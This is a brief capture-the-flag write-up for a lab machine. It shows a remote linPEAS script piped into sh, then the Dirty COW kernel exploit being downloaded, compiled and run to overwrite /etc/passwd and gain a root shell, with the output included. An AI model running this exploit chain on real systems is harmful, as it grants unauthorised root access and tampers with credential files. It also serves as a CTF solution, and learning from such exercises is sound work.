# WRITEUP 2

Once connected with ssh, we use `linPEAS`

`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

We check result with `seachsploit` and find exploit on Linux Kernel version 3.2.0-91. One looks interesting `Dirty Cow`

`curl https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c > dirty.c`

`gcc -pthread dirty.c -o dirty -lcrypt`

```
./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
zaz@BornToSecHackMe:~$ su firefart
Password: 
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
```

We are root ! 

